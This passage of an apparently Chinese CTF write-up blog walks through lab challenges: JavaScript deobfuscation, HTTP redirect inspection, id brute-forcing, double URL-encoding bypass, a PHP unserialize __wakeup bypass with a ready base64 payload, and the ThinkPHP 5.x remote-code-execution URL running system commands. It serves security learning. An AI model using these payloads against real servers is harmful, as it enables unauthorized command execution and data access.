5)break;&#125;\n解释：前面的o&#x3D;tab[i-1]是无用的，因为后面会被o&#x3D;tab2[i]的值重新覆盖\n第一次循环：o&#x3D;tab[0];p&#x3D;p+String.fromCharCode((o &#x3D; tab2[0])\n&#x3D;&gt;o&#x3D;70;p&#x3D;&quot;&quot;+String.fromCharCode(70)&#x3D;&gt;p&#x3D;英文字母F\n第二次...\n第三次...\n第四次...\n第五次...\n所以，这个for循环，最后的p为（尽管没有输出出来，这里我们知道就好）FAUX P\n\n(8)第二个for循环，精简一下代码：\nfor(i &#x3D; 0; i &lt; 18; i++ )&#123;\no &#x3D; tab[i-l];\n    if(i &gt; 5 &amp;&amp; i &lt; 17)\n        p +&#x3D; String.fromCharCode((o &#x3D; tab2[i]));\n&#125;\n解释：这里的for循环和上面的差不多，注意这里的p值由于第一次for循环执行后现在已经是FAUX P了\n加上第一次for循环的p值，最后的p为FAUX PASSWORD HAH\n\n(9)p +&#x3D; String.fromCharCode(tab2[17]);\n因为tab2&#x3D;[70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65]\n所以：p&#x3D;FAUX PASSWORD HAH + A\n因此，最后的p为FAUX PASSWORD HAHA\n\n(10)pass &#x3D; p;return pass;\n 即 pass &#x3D; FAUX PASSWORD HAHA;return FAUX PASSWORD HAHA;\n 最后函数输出为FAUX PASSWORD HAHA\n\n嗯哼？？？这个函数就执行完了？？？我的tab数组怎么没有用到？？？，我一开始带进来的参数呢？去哪了？别想了，输出值虽然用到了带进来的参数(就是分割后的tab数组)，但是for循环那里人家直接使用tab2数组相关代码的值，根本没有用到tab数组的值，所以由于代码逻辑问题，你传入的dechiffre的参数pass_enc是没有任何意义的\n\n三、dechiffre函数执行完成后，继续执行其它的代码\nh &#x3D; window.prompt(&#39;Enter password&#39;);\n    alert( dechiffre(h) );\nh&#x3D;你输入弹框内的内容\n之后alert弹出dechiffre(h)的值，由前面所有的代码可知，代码里p的值与tab无关，因为最终都会被tab2的值替代，所以我们无论输入什么，也就是pass_enc&#x3D;h，无论输入的这个h等于什么，不管tab能否被分割成字符串数组，是否存在，都只会利用到tab2。通俗点讲，有关tab的参数与值都可以视为没有，因此，pass_enc参数是什么也就没有意义了\n\n四、最后，结论就是，无论我们在弹框中输入什么值，都只会返回FAUX PASSWORD HAHA\n我就猜想，会不会String[&quot;fromCharCode&quot;](dechiffre(&quot;\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30&quot;));这个语法错误，并且没有没计算出来的是不是最后正确的值，也就是flag~\n于是，我不用它这么无论pass_enc参数输入什么都显示FAUX PASSWORD HAHA的函数，咱也抛弃它一回，自己重新写代码执行它\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;script&gt;\n    var n&#x3D;String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50);\n    document.write(n);\n&lt;&#x2F;script&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n最后结果为：786OsErtk12\n根据提示的flag格式输入最后的flag！<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>注：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">(1)split() 方法用于把一个字符串分割成字符串数组\n语法：string.split(separator,limit)\n参数                 描述\nseparator        可选。字符串或正则表达式，从该参数指定的地方分割 string Object。比如此题以逗号分割成字符串数组\nlimit            可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。\n举例：str&#x3D;&quot;a,b,c,d,e,f,g&quot;;\nvar 1st &#x3D; str.split(&quot;,&quot;,3);   对str以逗号进行分割，分割后的字符串数组内的值最多只能有3个，结果就是1st &#x3D; [a,b,c]\n\n(2)for 循环的语法如下：\nfor (语句 1; 语句 2; 语句 3) &#123;\n     要执行的代码块\n&#125;\n语句 1 在循环（代码块）开始之前执行。\n语句 2 定义运行循环（代码块）的条件。\n语句 3 会在循环（代码块）每次被执行后执行。\n\n(3)fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。\n语法：String.fromCharCode(n1, n2, ..., nX)\n参数                 描述\nn1, n2, ..., nX     必需。一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。\n\n(4)prompt()方法用于显示可提示用户进行输入的对话框。\n这个方法返回用户输入的字符串\n语法：prompt(msg,defaultText)\n参数                描述\nmsg                可选。要在对话框中显示的纯文本（而不是 HTML 格式的文本）就是弹框显示文本。\ndefaultText        可选。默认的输入文本，你输入什么弹框一开始出现里面的输入框就会默认显示你这个文本。\n\n(5)var i,j,k,l&#x3D;0,m,n,o,p &#x3D; &quot;&quot;;\n这个表示声明变量i,j,k,l,m,n,o,p，只有l和p两个变量被赋值了，其它的变量都是不带值的，不带有值的变量，它的值将是undefined，后续代码中可以给它赋值。\n\n(6)length\nlength 属性可设置或返回数组中元素的数目。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"Web进阶\"><a href=\"#Web进阶\" class=\"headerlink\" title=\"Web进阶\"></a>Web进阶</h1><h2 id=\"1-baby-web\"><a href=\"#1-baby-web\" class=\"headerlink\" title=\"1.baby_web\"></a>1.baby_web</h2><h3 id=\"1-题目描述-11\"><a href=\"#1-题目描述-11\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>想想初始页面是哪个</p>\n<h3 id=\"2-wp-9\"><a href=\"#2-wp-9\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p> 开始界面如下</p>\n<p><img src=\"/post/wp-Gongfang/image-20220625162533345.png\" alt=\"image-20220625162533345\"></p>\n<p>没有头绪，但是描述里有首页，再根据url知道这是个php网站</p>\n<p>php网站首页文件就是index.php</p>\n<p><code>index.php文件是一个php网站首页文件，index是普遍意义上的“首页”，也就是你输入一个域名后会打开一个页面，基本上就是index.xxxx（基本上首页都不会把index.xxxx显示在url里，但也不绝对）</code></p>\n<p>试试<code>111.200.241.244:59074/index.php</code></p>\n<p>结果又会到1.php，url又变成<code>111.200.241.244:59074/1.php</code></p>\n<p>F12打开查看网络</p>\n<p><img src=\"/post/wp-Gongfang/image-20220625171731934.png\" alt=\"image-20220625171731934\"></p>\n<p><code>补充：</code></p>\n<p> <code>index.php的状态是302什么意思？</code></p>\n<p><code>302 Found，原始描述短语为 Moved Temporarily(临时搬家） ，是[HTTP协议](https://baike.baidu.com/item/HTTP协议)中的一个状态码(Status Code)。可以简单的理解为该资源原本确实存在，但已经被**临时**改变了位置；换而言之，就是请求的资源暂时驻留在不同的URI下，故而除非特别指定了缓存头部指示，该状态码不可缓存。</code></p>\n<p>发现确实是跳转到了index.php但为什么又回到1.php</p>\n<p><img src=\"/post/wp-Gongfang/image-20220625171819943.png\" alt=\"image-20220625171819943\"></p>\n<p>可以看到location:1.php，这就是为什么无法直接访问index.php的原因，但flag已经得到</p>\n<p>得到flag</p>\n<hr>\n<p>如果用burpsuite查看<code>111.200.241.244:59074/index.php</code>，只能看到Flag is hidden!，也算是提示</p>\n<p><img src=\"/post/wp-Gongfang/image-20220625172122211.png\" alt=\"image-20220625172122211\"></p>\n<h2 id=\"2-ics-06\"><a href=\"#2-ics-06\" class=\"headerlink\" title=\"2.ics-06\"></a>2.ics-06</h2><h3 id=\"1-题目描述-12\"><a href=\"#1-题目描述-12\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</p>\n<h3 id=\"2-wp-10\"><a href=\"#2-wp-10\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>打开界面有些吓人</p>\n<p><img src=\"/post/wp-Gongfang/image-20220626084029917.png\" alt=\"image-20220626084029917\"></p>\n<p>但只有报表中心能打开</p>\n<p><img src=\"/post/wp-Gongfang/image-20220626084102777.png\" alt=\"image-20220626084102777\"></p>\n<p>看到url就有思路了，我们可以尝试id爆破</p>\n<p><img src=\"/post/wp-Gongfang/image-20220626084318243.png\" alt=\"image-20220626084318243\"></p>\n<p>利用Numbers方式，从1到5000，发现2333处成功爆破</p>\n<p>得到flag</p>\n<h2 id=\"3-Training-WWW-Robots\"><a href=\"#3-Training-WWW-Robots\" class=\"headerlink\" title=\"3.Training-WWW-Robots\"></a>3.Training-WWW-Robots</h2><h3 id=\"1-题目描述-13\"><a href=\"#1-题目描述-13\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-11\"><a href=\"#2-wp-11\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>这道题和上面新手区的题类似</p>\n<p>先访问<code>http://111.200.241.244:51820/robots.txt</code>得到php文件名</p>\n<p><img src=\"/post/wp-Gongfang/image-20220626090904204.png\" alt=\"image-20220626090904204\"></p>\n<p>于是访问<code>http://111.200.241.244:51820/fl0g.php/robots.txt</code></p>\n<p>得到flag</p>\n<h2 id=\"4-PHP2\"><a href=\"#4-PHP2\" class=\"headerlink\" title=\"4.PHP2\"></a>4.PHP2</h2><h3 id=\"1-题目描述-14\"><a href=\"#1-题目描述-14\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-12\"><a href=\"#2-wp-12\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>这句话的意思是”你能证明这个网站存在吗“</p>\n<p><img src=\"/post/wp-Gongfang/image-20220626104943938.png\" alt=\"image-20220626104943938\"></p>\n<p>没有思路，抓包，和御剑、dirsearch都没又得到想要的结果</p>\n<p>没有办法，搜了一下大佬们的wp</p>\n<p>了解到了一个新的知识点phps</p>\n<p><code>phps即为PHP Source：phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。</code></p>\n<p>访问<code>http://111.200.241.244:51703/index.phps</code>，得到源码内容</p>\n<p><img src=\"/post/wp-Gongfang/image-20220626105416606.png\" alt=\"image-20220626105416606\"></p>\n<p>右键查看源码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token operator\">===</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;p>not allowed!&lt;/p>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Access granted!&lt;/p>\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Key: xxxxxxx &lt;/p>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span>\n\nCan you anthenticate to this website?<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>根据代码知道，当id&#x3D;admin，输出not allowed!，但是想要输出flag</p>\n<p>就需要注意这句语句<code>$_GET[id] = urldecode($_GET[id]);</code></p>\n<p><code>urldecode:本函数对字符串进行URL解码。例如通过urlencode编码后的字符串，可通过UrlDecode进行解码。对Url路径加码的函数是UrlEncode  用法相反，和UrlDecode是一致对应的</code></p>\n<p>这里我们就清楚了，需要把admin进行url编码，但是只对其进行一次编码，要知道网站本身对url编码就有解码的能力，也就是在urldecode函数执行之前，网站已经把编码解码为admin，从而只输出not allowed!</p>\n<p>所以，这里需要对admin进行两次编码，第一被网站解码，绕过第一个if，然后在urldecode函数里进行第二次解码，变成admin，从而输出Key(flag)</p>\n<p>于是访问<code>http://111.200.241.244:51703/index.php?id=%25%36%31dmin</code></p>\n<p>这里的%25%36%31是字母a的二次url编码由a第一次编码结果%61再次编码而成</p>\n<p>–为了payload简洁，一般只编码一个字母</p>\n<p><img src=\"/post/wp-Gongfang/image-20220626110642311.png\" alt=\"image-20220626110642311\"></p>\n<p>得到flag</p>\n<h2 id=\"5-Web-python-template-injection\"><a href=\"#5-Web-python-template-injection\" class=\"headerlink\" title=\"5.Web_python_template_injection\"></a>5.Web_python_template_injection</h2><p>该题属于ssti，建议先了解一些<a href=\"../../../../2022/05/28/Web-study\">ssti</a>的模板注入，和这两篇文章了解一些flask运行原理</p>\n<p><a href=\"https://www.freebuf.com/column/187845.html\">https://www.freebuf.com/column/187845.html</a>  </p>\n<p><a href=\"https://xz.aliyun.com/t/3679\">https://xz.aliyun.com/t/3679</a></p>\n<p>然后再做这道题</p>\n<p><a href=\"https://blog.csdn.net/Mr_helloword/article/details/107949217\">大佬wp</a></p>\n<h2 id=\"6-Web-php-unserialize\"><a href=\"#6-Web-php-unserialize\" class=\"headerlink\" title=\"6.Web_php_unserialize\"></a>6.Web_php_unserialize</h2><h3 id=\"1-题目描述-15\"><a href=\"#1-题目描述-15\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-13\"><a href=\"#2-wp-13\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>看名字可知，这是道<a href=\"../../../../2022/05/28/Web-study\">php反序列化</a>类型的题</p>\n<p>开始先分析一下php代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Demo</span> <span class=\"token punctuation\">&#123;</span> \n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token keyword\">echo</span> @<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span> <span class=\"token operator\">!=</span> <span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n            <span class=\"token comment\">//the secret is in the fl4g.php</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">;</span> \n        <span class=\"token punctuation\">&#125;</span> \n    <span class=\"token punctuation\">&#125;</span> \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'var'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n    <span class=\"token variable\">$var</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'var'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[oc]:\\d+:/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'stop hacking!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        @<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span> \n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span> \n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><a href=\"https://blog.csdn.net/yanbai3/article/details/122300480\">php代码审计原文链接</a></p>\n<p>首先定义了Demo类，在类中定义了几个方法<code>construct()wakeup()destruct()</code>。在这里我们要知道，</p>\n<p>php中<u><strong>类实例化的时候，首先运行wakeup()函数</strong></u>，</p>\n<p>在<u><strong>序列化时先运行sleep()函数</strong></u>,</p>\n<p>在<u><strong>反序列化时先运行wakeup()</strong></u>，</p>\n<p>在<u><strong>脚本结束调用destruct()函数</strong></u>。 </p>\n<p>继续审计代码，下面的<code>if</code>语句中，先用了<code>base64</code>的解码函数，进行了一次解码，又用一个正则表达式进行过滤，只有<code>base64</code>编码并通过正则表示式才能进行反序列化</p>\n<p><img src=\"/post/wp-Gongfang/image-20231004231043515.png\" alt=\"image-20231004231043515\"></p>\n<p>这里的正则表达式<code>’/[oc]:\\d+:/i’</code> 表示了<code>以O或者C开头</code>接：接数字，数字至少出现一次或者无数次，忽略大小写，所以我们将<code>O:4改为O:+4</code>则可通过正则表达式，因为在PHP代码里，<code>+4</code>就是<code>4</code>，所以绕过了正则匹配同时也不影响代码正常含义</p>\n<p>这里看到了<code>fl4g.php</code>，先把它实例化，这里改一下代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Demo</span> <span class=\"token punctuation\">&#123;</span> \n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token keyword\">echo</span> @<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span> <span class=\"token operator\">!=</span> <span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n            <span class=\"token comment\">//the secret is in the fl4g.php</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">;</span> \n        <span class=\"token punctuation\">&#125;</span> \n    <span class=\"token punctuation\">&#125;</span> \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Demo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fl4g.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//这里我就在想，如果这个实例化的时候()不加参数，那么最后序列化的结构只能是index.php，也就是源码中的，但是我们的目标是fl4g.php这个文件</span>\n<span class=\"token comment\">//这里其实只需要在实例化类中，传入我们需要序列化的参数即可</span>\n<span class=\"token comment\">//这里相当于给$flie赋值，如果类中多个值需要变成我们需要的参数，用\",\"隔开即可，按赋值顺序，例如$a = new Demo(\"a\",2,\"b\");</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><a href=\"https://tool.lu/coderunner/\">运行PHP代码</a></p>\n<p>得到<code>O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>\n<p>这里看到有一个<code>__wakeup</code>，所以还要改一下属性值<code>1为2</code></p>\n<p>–&gt;</p>\n<p><code>O:4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>\n<p><strong>注意：</strong>这里有一个大坑让我卡了好久</p>\n<p>先看下面这个图理解一下上面的语句</p>\n<p><img src=\"/post/wp-Gongfang/image-20231004231058765.png\" alt=\"image-20231004231058765\"></p>\n<p>属性值为10，但是”<code>Demofile</code>“只有8个字符，很明显缺了两个字符，但是却被省略了，猜测确了<strong>两个空字符</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度\n\n所以也可以推测出Demofile是private声明<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>这里我一直卡住的<u>原因就是把空字符当作了空格</u></p>\n<p>所以开始我是直接在D和f前加上空格，但是底下的base64编码提交url没有反应</p>\n<p><img src=\"/post/wp-Gongfang/image-20220628214059503.png\" alt=\"image-20220628214059503\"></p>\n<p>然后把decoder换成hex，发现空格是20（44是字母D，66是字母f）</p>\n<p><img src=\"/post/wp-Gongfang/image-20220628233504338.png\" alt=\"image-20220628233504338\"></p>\n<p>然后看了下面这个表，明白00才是空字符，空格和空字符不是同一个东西</p>\n<p><img src=\"/post/wp-Gongfang/image-20220628213218629.png\" alt=\"image-20220628213218629\"></p>\n<p>但是空字符无法复制，在复制时，空字符后的字符串会被截断，只复制了空字符前面的字符串</p>\n<p>所以这里可以在hex里直接改，把20改成00</p>\n<p><img src=\"/post/wp-Gongfang/image-20220628233851825.png\" alt=\"image-20220628233851825\"></p>\n<p>然后下方的base64编码就可以了</p>\n<p>访问</p>\n<p><code>http://111.200.241.244:50547/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p>\n<p>得到flag</p>\n<h2 id=\"7-php-rce\"><a href=\"#7-php-rce\" class=\"headerlink\" title=\"7.php_rce\"></a>7.php_rce</h2><h3 id=\"1-题目描述-16\"><a href=\"#1-题目描述-16\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-14\"><a href=\"#2-wp-14\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>开始界面如下</p>\n<p><img src=\"/post/wp-Gongfang/image-20220630174402928.png\" alt=\"image-20220630174402928\"></p>\n<p>（看到thinkphp我就想起今年国赛也有一道think PHP的题，爆0，麻了）</p>\n<p>这里可以先了解一下什么是<a href=\"../../../../2022/05/28/Web-study\">rce</a>和该漏洞的成因</p>\n<p>如果这里版本的thinkphp存在rce的漏洞，就可以通过指令获取flag</p>\n<p>百度可知</p>\n<p><code>ThinkPHP 5.0&lt;5.0.23&amp;5.1&lt;5.1.31版本在没有开启强制路由的情况下可能存在远程代码执行漏洞。攻击者通过该漏洞可能完全控制Web服务器。</code> </p>\n<p>然后在Github上搜thinkphp得到<a href=\"https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection\">payload</a></p>\n<p><img src=\"/post/wp-Gongfang/image-20220630174951670.png\" alt=\"image-20220630174951670\"></p>\n<p>尝试<code>http://111.200.241.244:51053/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></p>\n<p>了解到最后的id处为命令执行语句输入处，用 find语句查看有没有flag文件</p>\n<p><code>http://111.200.241.244:57210/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name flag*</code></p>\n<p><img src=\"/post/wp-Gongfang/image-20220630175318946.png\" alt=\"image-20220630175318946\"></p>\n<p>得到的结果很乱，用F12整洁一些</p>\n<p>最后行，看到flag文件夹</p>\n<p><img 